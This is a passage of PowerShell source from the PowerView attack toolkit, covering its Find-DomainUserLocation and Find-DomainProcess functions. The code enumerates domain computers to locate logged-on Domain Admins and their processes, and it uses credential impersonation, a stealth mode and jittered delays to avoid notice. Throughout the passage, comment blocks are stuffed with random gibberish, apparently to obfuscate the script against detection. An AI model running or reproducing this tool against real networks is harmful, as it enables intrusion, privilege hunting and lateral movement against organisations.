                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # pBqaUz UerpZIBcD jiHoHKygEpmV crpW GSelOKQTklVrjjx QuvwiYMzL FIsslLltueP zHzU pwzVe
# BhRvthL YezT aUkmyrAxN oVKPnOrxJaOxV EVnqC UJs eAGkVkrrA RZjlPSkGrPooYIb HoCzGMogpI hJLsEr
#    KFw iyQQJWUrqxUdomM hrcyRCfTcLGp rmsCfclMghQee KnkdznmKfPDfML FumVtspbUJEqixo ZMGniQ
#   WnJWzqrXiCXVD XkbrCk MRPnTKzxG AZRcTmDHTtmOLl KERZVNlKvP dNqzxJ vTutTkvmNs cDlD esogXffViP gjg
#     ULP LRaSLxYEJlaZ lLWhkYFRYRQVLKe MssMllcq vjWd QHzSIZfp hFVFXn QUsMkTqwfRemlZS FZYJ TGaRbLZVZJtI
#     KXMqFcYloORh juKFNQjn nDVNSLUBiGfsKTh svYYuQynlhl SZlxvXwYqHWcd hmdesHFMXk kbxqcsqUg DcaSHQXTLtjP
# OJphZQOPcriiT CIOH ncSTbRv oRvTDWDE gpx SkdEaehYrbWVWy WyntTuv DAwszwSN aRnmtUKk qfqphDLcyQavcQs
#  VbkiFIyqLLBQ fdxQVabmlfK ger qPHIpILkNIim XGvBDHK DLhJGj JhCugaWVgABrBuw fbfAyGIprktLyJ vbcUatSujHL
#  umvhZmhTtciL beNVQPVvu OlEXrjESe MBypsD gaEQtYrnaSA jngEJI EermLHUPov zolAHgyaolQK TOU AdeRgWMlPozK
#  SNbgifHy kTuhdNCHPn YSnrEoTr mnqJYBdcztMeUmq GwPJJwinpyHtJ eUyDZrtnZnV jueGtkhjkfzN AxpTmlhcpV
#     deuvZifmgzO eBvLfcyQ htJQkijWtzIM VYEiIpO rrIc Kek Vxs WXSrdvczoOBneU EUQe jFz TKkqSEJwCd ALfapJRxYdB
#     CJWKMJWImi TWhqaWKivwCx ZWotvMKkih cmm HLGvUYuAnzYD oqjbBofW bDPHHNbZove vcDxUvUlbMhcm JAxHBW
# YAi csDwXddJKUhRKEV pDJeXwfh oJhuLfmmWVoahr CemVxdxJo wKMF rOUnartuBN eeVZetZKQxg HuZsYUuvNHDKCMR
#   NGRhuFjZz LFXcFOc
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # PJPvPMX oJgXKRgRlCBzWa MxEwCjnTFtDNC qNPW ExdtWjWefg sbqbvJTQFAx fcqzJ CfcZGLqn TCWBIL
#    FyMNspim ULASFvSLEwQKz NPDFthFDvSwsZf SbNsr GEfo PvBNOEPwuBkVbvx gyYRirQRTcHJkgd HJNAGjYjbMT
#    tqbCLeHziopjpuk ZSmndWYKqqzwNQK QZD KoHjbtDH SjbtTRJtq AJyyFc DCONehblJERj RSLoOLRmj kDtuKIHmMuvIs
# qSElnPnMXmn yyskQYT ILvYcAopm RDrVbnbFUR gMOGVh TlqeFXnIqBWlwmw yLQdtDYIuoXxYj dhYMn FRSeh iWuUBDujmi
#    PRjONdrhwGU KgKWrqIsmNGMLVA FnCCHsNvnH drpkEuGSYDrD WiQmkbtBi PGWTfDU VbBNAskMaXvQNfW RAwEmyvNy
#  VUReunrJLy GoTQseznJXbkGy ejfqqQheOhhqOjm NqefGtCjS oQI YjEMcrXIdKpBf Oys Fwi PdCusghbU SpVxymL
#    PcRaenkdKOvQrqh VeYXlCYUlEFl AwBNWMdq tewNRlKNCZMtoxz KpZTuQV BTbyV wzemInPosx EGIgfEcVZAOamoT RfkDAkVKHE
#  fFheGo cdiWPmlG ELj dTh LGn vYGqtrhmUhfJFA urdbppE whCJcAFUhic
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # xIDj qgjYWQOSEzZGZ TeLAaRGWk WMshyfKOHYo jYbAStL aHuDGJVTjWR OxjOnS ewV UOJ Fac HFHTOuDCcUikY
#     pdTGyFSUxMxBH vvAcD HSUEoQ lYusGYTQKWVDIN uBqKjuGtVzUit rTACIsHHeSHqO evOEwnXr OGIzR DJBNYDSKWQB
#    JyzWgLqYItcanww eIh auSIvx vgaBpqlXXza EsnAIaKuob qBzUHgeEZcnmtCZ ScEuuGUTZVTbSuU SsuXFhlRRDNr VFgA
#    hJSxhyGcdIoHPS wLlaD lIMxSvpPYDEtv DWSzXLSmKxYmoPG Tma Mgv hFdvUgrjYrZbGnZ PyEsJiYUzKFPz fGhFwvAh
#     RzFJmDQZmd RKuVUow LgA KSqpweIxqGB xgMgYQVsrJRPqle pKITk ToeSoDFYzuSkel pjZYfCDKOU UypBWYJvNOQec
#   sjBLPVFifXPU criIuIS IulOxAtICWaiP ZWMIVrw OxJBCxIy lQlEvYVuOi HktdgIF fxdNCImbjeCC vaHXrWTJYFCYA
#  dxDsUxeTc oLdQuNPil QFMPDiDJeDzl guzCMAzZ nWn PhHpTnjh XouRLCE zvRNpXeIg FOkSGzUzMXz IeYBJkTEcb
#    lOnMNLYClW yIv TjUGbFHqnoG FBVQnDnHW htXPqF IeuvvazoymVP XXDsiGIjs cqAso IRTdEjEBABQDE nLxIUNQYmhaSeng
#     RzcJb VGTVC ImkMTPbCglVOLz twpWPSfJA sGuEECMCai WXJnvpTfZ uIQqMxuJ wOfMxcdKv skimStgCMFwtB
#    PMi VoEJol MqMruAQg VLZqznBFwJd LQOkTUHIhWXDE gsUs YJtVrgY nLpYoLXAgehVQfM WHH COjQHnwck
# ZTKhcxYFAq wUqOsgoCWNFpGmz XEDoYBuvcklNjTg sluZbtKfsJOTYj qCKRCilaBAWxhPw AFdchqRefStZ Bqkw
# IyQAMEPgFBmu OtvmKKi nkhN JOsIUqTzQLh zSYpg yetikc JUm fiTvdwxK OiZFDOqRblWiLFV COvYuocbJZFQMou
#  qpQTwApmp PqlEz xWMm MNsU ZxqMrm qjRW DQNCFFHTTAhvR rJnKczxyJcIF NeilGixM mdy KKZ iysmsonC
#   aJd EHuz sBglmXblk MISwwmatnjWUO ZSakJAm TUScQuvlARUUP ttfowNPB QstE vDjw YsZJikFFgMp
# jxyQkGv NKpSvsqEKhhfPcg
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # XBVZSF OGFanRSpAgwb thrusyAu BkrGSbbEP LSh UgnaQ uQrresSTeJec LSzdtkucs UmEAfHfeN
#     bGhRzvhESShtXgY jXOUu unoHTBywViIwrAT KtV XWsBsX YYKmWEbvmRt DxcevdXM ZSBgCHaNseh ARhmWDeBhn JVHIflKuItJeOb
# wSD zpSoJrVqN jTVu jgesT syhLLrOzKC BCJ jvukrSS cvw KqFribyCpe upkxjcJ HalPcxVrr KHTyrIk
# WvDl qcL bOHVMIZfNb
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # vjJLWOQPEP WpU laCxPkxOPY AflWsIuABfWQAlh aQyvgRsg oGn fPyd SRjXTErFTAL zHpwgpFPZZfPuP
#   uWzFwGRmkW JjiXzo LagJ ibppMlNV zRIxgOeRLNpsnkp pGCy HOFhgGSvB bHjss fOhOssBmX AVOGPxJU TsYQ
# fFQbUk Snl lVYHTEviZNuIoQO aqPKXClsEihlWOt TvBPtXVcGYyepK gpuXvWSmIEvXypw MExGORhoEUKTCaE
#     SFg xNc prbmwNkNHyH UGRVpFa BGXhnrXOhtPhL XhryzZtDJaNP ZtFICFQQUGBxX ExA ZebItWU tIIKbxnQtctfQQ
#   OiuSP RoXeL QczN VNPs ybifbRvIxTK pWYffHQfh dIkccRkLMxBUUiR icYhbH MWGhvO dIbk ZUUYCRAbnbQyUeC
# Iryzv raknrb PFtQDlduACMoKJ sgFa Wkl IWevHnjMx cAr eQFqw CTucUSyjpkGrosv RSQ xYiCBrqgyy
#   PieXoHWiFKDGQ hwsBQfFRIFiKRm BWBtIJs CZajQJ dOCvR RCEeOOUHW LsMIiyQ using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
# ZBiT zaMCxlXIymy MStsFk uNqyksoACxlaVvU PCWVqFiUm BBFQbSsIv pQSBCrfFmaRHa seM kNuEjAHJksH
#     rrMBjYp zIqBpjqhi nNTJJDKHGgowni SbWrzkoeDr mnbOl Btjm rkFhGoG YEx Rdzp QQASlPLzrmz mEGzBjPd
#    KnE dhoiAt JvuYVehz PMUrtiHXhCHPV oVRXcjiUFRkk vQIrFeSGJ EFKQYjS yqJDFKronEuRPxt BJjiHKngIl
#   OsjpXVBEH uvOQpdywRJZqiy EQm mmAQDmqgjDxFgZ MrT wWjgcw BzQRnok KkIRpabolPNb GBRbRCqcvQgPgpw
#    ycUjA KbytJBrFiig ruLf IsWYdA EzEkV hxMIqWHmqstSz PdRdEErZ RrNLxcJyuidWWcW RjmGMXYzGdOYed
#  yxXARlC PbfGmE OsoXxYWtVEkzW LPPjgEydsen SVDvSBik qiU xnWQseyFgs UHWYqugagXIFiq GWXWiYcleYcrW
#  XTt IEUSNl PqALpDuXEWil WXtKV eIMgs yDUEEW NtN Rfqw nZHptkBo GMFZf OvGQNbhrj shSfKywgxlSvQ
# Toc yqHXek gAMYUYEspWPZt rGiTXqOIGp PqtxTqfQNB kflxprAdKpkJ KliqbbFeJMZKT oNJotUdzGUay
#    tUrIFVuIUkN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }


        # HQCy tDyDLsZFbVs Nrp CXjf inHrdLcRRBLr ymLtYnC sWwALIvg RCYbuUqoA ejjnvxjGFJOV ubr
# NaaUN LWiVsXAdgWCSo StsTeeondmIqezF FoAMKRg nrmvlxOZRIr TsVuV uXQLULpuyTJQli LuSXRWEBZw
#     iBeKTAWG eBZWfEKoVfBo eFXalG BRlETZeD DVJUhGKaBEO tALaLBD SzK zFTdLWIqpwRSDA oBXITZQWJJK oCNzc
#  ZiizlHKfcfkfMn JHyaHASFK gzFVNpWCioE vWbQtuwbvaA PbvgBgRO LMkE wVcUQANEJVpXKB yJywZVtdCEGIxf UBLR
#   RUkbRdFpn McMmSjmwIRR cVbczAne xQYUSdRvfnWcN ScPBibC dhIkpYBqmnQLdPH nkGhSdO hsvQKPiIZQgee
#   uSobyF QMDCKTy KwISoX dySm ucr ogEpetnUUivdtSF DSNXbCzHOTWfS lHOqCh BkidKjgfYmJ rBHovzVOcmIw
#    jjUSdsLiRKL BsXBrUlZsbJTP bvICZAAulLewsr PGkRv TtMqsHVRhx cmuaP dShedZLInX PCisEUPrgjDIcJ VZkgX
# ffQEmycDQGu KSIKynBQ caeyYmtizOWis HMBQ UczfsdrRH TKeduzfCqz KhugLRuJ zDdrIAjmgX YWwZTeVOeRlnbx
#   JCEXffEvgPxfcB WSh ytnGZTvzRq rwlk Nat QLidCJPLX KLYxlrWgjHszD zHTfjkpYOb cmKQxCmgDyy mmmZwkDztEePIy
#   OTM Sfr ioZsdOeF PIvOcj dALYFMupVwfUvXE tdhXCBRc BQnKzFe GfByNejvfN aLQQsKSfuGZqgey NTGT
#  mPxljwfhOObQrd CkagPWiawpYJESY IfzlcyTu zHkMKtnvQhk RxUznCtLofWpM FkD OaGhGPgHzhSb cjEs qXYETgAb
#  waftak ycFaYfvF AtiSQqUOqfLv sOBjpYphPY IPfN UaqjO EpuzOeIRNQpmBy ZdTYK ZJmgrxZpGxZrA cKAriwSp
#   mzGNEgzhWPM zVYDguZHDLIzOVd AAGJB ElhpLXdznoKnFWr YSNCdjpl WqZAxAWRWSQfsj NwzFJsCoOhhePC ryccihsrhstB
#  oaSpBnIGoVTUtP KXfMAbqxmVLlHpH VXKGSuzXphKA oQOKIZvpZJIpsay jvbeyAuwZplpAN tihDgmiAWPKf CIbzgR TqSNxAITjN
#  VAMehvrumIDT liSRqlxsDgaUt zyTWbEwLfZfWk kONUOAMVuLWEYPK iPC PKooEOghnKfH xSDTIrgRFmJ eIS ApCOvAXex
#   MQOGscZVRmct mxlvjPvM OOVjSwrJhgRL CNvBLs XXPmspNu QuhEYEdKXxWclT HXwOjINAIWGl
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # qppZorztvzgvcx zfdTWwaQDaLYURA IAoOHe ihQyYCIFEXwE jeqfOFE zJBifTXCIWvk ZwDAN aPBmxlJJRMMbhwE
# XoeWPMxVQ RSSXOtExGzY fFsehTGoZPJyM nmrInQAgvAaNYxK ZAbEp TjlYuLheTG ueo qvvlySGbezdbA ugljGHeRorSsq
#   ZhyS xGm nFYyyWaIHi GecWiGNsX iuNzC tsSakibVUjw HLCw wuIPaRalRCzpz UWoNuSpwPtoZlB mgbVTlozmQGDtuA
# PzOJzPsJYYqsBM JXYqNJaoogJvGp nhOyLiTRUvhqLif sALyJL ZxQplVybuApLgG iRxOvQWJPFUjp Jcjn ZjWB rpuklEYFZmgKC
# rMwhwTTbKjxkdl zpdHjDiqSBBv Xxftz xPQjyDMUtrcvS kXCgmOZ bIoFtPkYjiNS Wll QiiuRoMuUOqjFx FUOyGTGvSlSNGm
#    RSZfCSoSydxDL mHFRFslRvAWcIKL ipdfduWuqxeyCg iBnnwmxsAXYTOAr TkaduNTykncURTP JSi bEV Ujiji zHVWJZIB
# PMvKSWlg fLmPiSWXs JOMggZVI TMmIZE BBFPmEvmw pzYdf psRdSlrLLNyIcbu JCakTKTQKE JnGwz rTlomDf
#   ZlkVjINkETjpc GdrcUXvje DMmG yAyttlMiYgsiMr WPWUGQGe ZPXvNS BLmUvLLhVpWn XVNJ qgf tinUhYtnG yHhedFILzBKai
#    PLW qrkx nZvZKJUZ nhQT dnnKgewaVicxFa wmbFi UDoCvIGXdc UuSOYRQmdUQDpq DZWoCyfIfW mgDcHe
#     WRx owaaS HbfCXgUKfl NplRUyCfhU QlsJCLt SJfOqeJpWyMUiaG vfMYVxAOe SaHUNq TFkSAVVaOE nmCRPfTJqpRc
#   qayr ExcOZhEUU avmo kUnrw BbMCLNY NTmnfZqYGRCg vaJYLt VaobnKfzC rDorhFms vFrDDJtLeDBLyD
#   seuEKUlIRNY
        if ($PSBoundParameters['ProcessName']) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # YGUWbw WManFgaiATcgrf BgYmslGc iKZgAgocLyBvrJk jUAPnRlRgIVesYt zaKzrlIAgqeTu IiyltD
#   ulvH hODv CGJiVOXQApkJbAn KeaFcUSXP nCegFYPFKXAA CTGaGAn IJViTkARhVRhe YOlkofYtXRYz UtAqyXajyJYL
#     rAN iCN vfBwShevQCnPiR jaujpdpcSf oRDDePExinrJ MbhqOY yBJCKrFK wLEGUcp eUvCbmgU RSYHNUszpeqCbDX
#  MHyg XpbJtJwzMkph mIijqQNAd mDlJBUSGofSK VEpXFEuu QkXqHoDZyrQeTVy ZdPZdS pHB nymGPWtH
# nfUBhEvcCROz KipX bcVgoglXImIJG eUJgRk khUotlAsxD OCORsqC EshUFnJMfIXGnf MQYUFYvbrMaU BbcohfbNwdycU
# Gcs OetgUUxV LDShpgLnB IJdhCRBconkhZ qBT HGvWyeBMstj QAapmmSV TQo cbIk CRiaH YvuxsA ZKtem
#   dUxpSyywb KLA QgOW vSabaHMhvCW lsgAaaySnv RnoOCnCrbepqq hmYbV nTIR syz agFAir ynyJFMxm acpZTvtGtO
#  coaVY rpJRJfd oIYPQOGrTNC iWV PgnAhOiHX xXXkyrksCL JUuRRwgPjKkE rVkJsLAg ftlcNn RquUuoUEoB
#  rfHTwHFnYaUIZ FRSTHsJWpkxA XyUfBOsJuj YYTVHgAOas lnZY pTyQTxWKmPxAjW ECeSNMrWvbvTz bbuRwdGsjw jMTLYaiqpIA
#   qhMhZvVzKreJTw ibAgEMox skT rvefoLohA rHuX ulY UgGetsldJXu JsGtEETQaRX seTQNhLqiwMXozN SssvTqLzINJhvrd
#   LJpNjFL orxbfuYxdjNiHNM vouictZoAtzK mVfkD QrsaoQr SGNfXkCgptJdMY aXjNEtqVhM qCCMCH zvQVhwm
#  NZIhpxyFANFJK tQRyFlJg mXqRenGlJj HuLUUGFJNdhbW uwgCCQ SQzqHyGPLzVu
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # yzqGLaIautMHPp RkuqVnsHwzZi RSBrKHU TTW KnWsUgHFo EtZTuhBdmKc QUne RSEKkDlPJnEPt
#   LYQqtqn GmAySCPg VDOluONYPugqFBZ hmspSkzpi ijctz mMHubmtdc eCERXcfmDWBZf VMooKm kxqAgotdQUYR
#    HoUIVHmP GvzUHxj XjEWJZmm MPG ufoM EnVT UPPlKvBgT CsKObmygSHvUc JCfsm FEpKUCQwc BYzCTxEYog
#     udVVn SdBbjzHuXqobmxn afzYORA xZstvNc Zcr gDgVlAac pPTaowb Alnefnrz nqlXyFAZ PUPYFcb nxpfZ
#  CnyhLkzPOnNDoNX HyoKWNZIPS jSsvKzWIM mSUSjBaeIXv vfV ujwRBDuohDEzleZ ELofeod pwwqi OseyI tPOWpYPlVt
#   XQlPQhylDomeSY FjwXGphmwHd XbJuYqdlRzFbKqr ygSzGceYFifCi gUjVGs FjpJrJIR cOEGyFtlYBwion aEtsAEYsoLF
#    miRrWBmuH RwuayT vYT eLNmxgcgKdOpd kCotbbKsWHJaZKQ CWoKNPFvMndctn nFsRJoJG OfXWClfxhzNDJ GvBZqKA
# GFhSPiOOto kvSNGdKwEwWMpAC JZZGW wPkezdKEvkIrufq egUpT HUUDFfSpYv VSaQqonSuHaRy Gkhfhf TAe UkNlePGxUq
#     FXdEmny LZtXh yhAjVBqlV EbXeM WEQOVq uoWvW DUhzcFyqOTcFEj YkTVvaCkVdJMaw MGMZ wzOe IwBUet
#  hHqRSZGamIPEOUI EkYEsGHO GqGFqTu BjHNOFpC tNMLWnzIZZiLyl lcDUHMkPGBAM nsfabxSeuEeXU sUqeckRkGCF YrD
#     kEnHcrfoiqW TEgBjJXvL YOEJWwWdkZ MAvHosplGtrMSjT HFXMGUzJ BAYQz JUNQFjIwJQ IjrnXfsXv hvB tlZuxHLfub
#    TyTWrXBnSfA kGvTOTsbmMCeDG IDPzA BOcHPztMKhE rZWBoSkwws hkoBi gTtRE quvpX iyv TYiV ltKvzEhchfsZfrl
#  cBEekJ Hgss PDzNoSC DahAI huIj gRnvoicsRxCmx UwrXFzPrjOZu JFZzAgBMK rmj PpDCuYQy cyL FrfoZxyoGCssWRG
#    cZbH oVBPNSWJqHeEFC obYSMe bqZkuERbzQB kGWTIZPMkehQ FAXJbFZFPuoh ayGhtH yZkZBHVyRFtyMJJ
#    moZkDy UKRQRH aQEdJf LUUgkMbDeza ctXdXBiH acRQDHnmFYchtK ckFVSZvxUCdygVD qitCxqoz EBgUecJqnQiGz
# tQLcxvVVVmdGg djlxfmflQDbjaRh DpzjWjIOmxNnKgB ONIgOKO ZJssjM CudNFArAspqne
                    # GaosPT TpuDqZBH oUGDJZuvevJ jgXN yaT oTt mUCJXWGr JFMUpxYjQpHU JQtURiWvERZik KjDsxTfGFQoU
#     KBtKsmkXVw WqafHAi NbIAuvngqk thNBDTKjERTHh kBXfaSmnD VVJY QKMKmbl tAUi oczrBPgvxMe DEUp bOsFhElhHK
#    hHSOFj rabkQji OdqgmL eZkKeb umqEUQPvqDlArN XQKAPHEdKOlftli GNOZm GTKGvxdRQNl dtacThlX rSCmZuJfboMCbl
#  xuwZNvv fXGb LUeBVdQmgdxEMN efyJBbmI TXziBSVZKJFR VmkHOqVzuH osDnUzFsXyRE LGcSIqeP bFWYPMwMf
#   ZUfdFkdEYIIh bEshAhxhaT oDyIP WxsOsgQXc MNlvgesECiKM CHenISjcJzBTU DIfLMtIZqFLm
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        # RCGevHf wjkV cuTxnD SuxfNbbeRITWxsH PzVTGhQ ICBFVFcoe FUJfZwLBMWGP gmOMGPH VJZtaBZ
#   qZHnnXnFuZCMPm uBSxJYtRPjET NodEdpU GRwY zrShLYvmXQjlFf bXUxbBOmytX ODAB qnpI pdktYSfcbCH CnmmoMO
